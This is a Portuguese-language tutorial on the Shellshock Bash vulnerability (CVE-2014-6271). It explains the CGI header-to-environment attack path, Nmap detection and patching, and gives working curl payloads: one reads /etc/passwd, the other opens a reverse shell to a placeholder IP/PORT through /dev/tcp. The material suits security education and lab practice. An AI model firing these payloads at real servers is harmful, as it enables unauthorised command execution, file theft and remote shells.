# 🐚 Shellshock — CVE-2014-6271

## 🧠 O que é Shellshock?

**Shellshock** é o nome dado a uma família de vulnerabilidades encontradas no **Bash (Bourne Again SHell)**, principalmente a **CVE-2014-6271**, descoberta em 2014.

O problema estava relacionado à forma como determinadas **variáveis de ambiente contendo funções** eram processadas pelo Bash. Em alguns cenários, um atacante conseguia fazer com que comandos adicionais fossem executados quando um processo iniciava o Bash.

A vulnerabilidade ganhou grande importância porque serviços que utilizavam Bash indiretamente, especialmente **CGI em servidores web**, podiam transformar uma entrada HTTP controlada pelo atacante em **execução de comandos no servidor**.

---

## ⚙️ Como funciona

O funcionamento pode ser resumido assim:

```text
Atacante
   │
   │ Requisição HTTP
   ▼
Servidor Web
   │
   │ Variável de ambiente
   ▼
CGI / aplicação
   │
   ▼
Bash vulnerável
   │
   ▼
Execução de comandos
```

Um cenário clássico envolve um servidor web configurado para executar scripts CGI.

Determinados cabeçalhos HTTP, como:

```http
User-Agent:
Referer:
Cookie:
```

podem ser transformados pelo servidor em **variáveis de ambiente**.

Se uma dessas variáveis for passada para um Bash vulnerável, ela pode fornecer o vetor para exploração.

---

## 💥 Por que era tão grave?

O impacto dependia do serviço que estava utilizando o Bash e das permissões desse processo.

Uma exploração bem-sucedida poderia permitir:

- Execução arbitrária de comandos;
- Leitura ou alteração de arquivos;
- Comprometimento de serviços;
- Roubo de informações;
- Utilização do servidor como ponto de entrada para outros ataques;
- Em determinados cenários, obtenção de controle significativo sobre o sistema.

📌 **Importante:** Shellshock não significa que _todo_ sistema Linux automaticamente estava vulnerável. Era necessário existir uma versão vulnerável do Bash e um caminho pelo qual dados controlados pelo atacante chegassem ao Bash de maneira explorável.

---

# 🔎 Identificação

Uma forma clássica de procurar possíveis alvos utilizando o Nmap era:

```bash
nmap -v -sV -p80,443 \
  --script=http-shellshock \
  --script-args=/cgi-bin/test.bin \
  127.0.0.1
```

O script:

```text
http-shellshock
```

foi desenvolvido para auxiliar na identificação de possíveis vulnerabilidades Shellshock em serviços HTTP/CGI.

---

# 🧪 Exploração em laboratório

Um exemplo clássico utilizava um cabeçalho HTTP contendo uma definição de função Bash seguida de um comando.

Exemplo de demonstração:

```bash
curl \
  -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' \
  http://127.0.0.1/cgi-bin/test.bin
```

A ideia do payload é:

```text
() { :; };
```

representar uma função Bash e, no contexto vulnerável, o conteúdo posterior poderia ser interpretado como comando.

---

## 🔬 Estrutura do payload

Podemos separar:

```text
() { :; }; /bin/cat /etc/passwd
│────────│  │────────────────────│
 função     comando adicional
```

O problema estava justamente no comportamento do Bash ao processar essa construção.

---

# 🌐 Shellshock + CGI

O cenário mais conhecido era:

```text
HTTP Header
     │
     ▼
Variável de ambiente CGI
     │
     ▼
Bash
     │
     ▼
Shellshock
     │
     ▼
Comando
```

Por exemplo:

```http
User-Agent: <payload>
```

poderia acabar sendo disponibilizado ao CGI como algo semelhante a:

```text
HTTP_USER_AGENT=<payload>
```

Se esse valor chegasse a um Bash vulnerável de maneira apropriada, a vulnerabilidade poderia ser acionada.

---

# 📌 Reverse Shell

Também existem demonstrações históricas que utilizam Shellshock para obter uma conexão reversa.

Exemplo de laboratório:

```bash
curl \
  -H 'User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1' \
  http://127.0.0.1/cgi-bin/test.bin
```

Aqui o objetivo não é apenas executar um comando isolado, mas iniciar uma **shell reversa** para uma máquina controlada pelo pesquisador.

⚠️ Use esse tipo de payload somente em CTFs, máquinas próprias ou ambientes explicitamente autorizados.

---

# 🛡️ Como corrigir

A principal correção é **atualizar o Bash** para uma versão que contenha os patches de segurança apropriados.

Também é importante:

- Manter o sistema operacional atualizado;
- Remover CGI desnecessários;
- Evitar que dados externos sejam utilizados diretamente como variáveis de ambiente para shells;
- Executar serviços com privilégios mínimos;
- Monitorar requisições suspeitas;
- Restringir serviços expostos à Internet.

---

# 📚 Resumo

```text
Nome:       Shellshock
CVE:        CVE-2014-6271
Componente: Bash
Tipo:       Command Injection / RCE
Vetor:      Variáveis de ambiente
Cenário:    CGI e outros serviços que utilizam Bash
Impacto:    Execução arbitrária de comandos
```

### 🎯 Cadeia clássica

```text
HTTP Request
     │
     ▼
Cabeçalho HTTP
     │
     ▼
Variável de ambiente
     │
     ▼
CGI
     │
     ▼
Bash vulnerável
     │
     ▼
Shellshock
     │
     ▼
RCE
```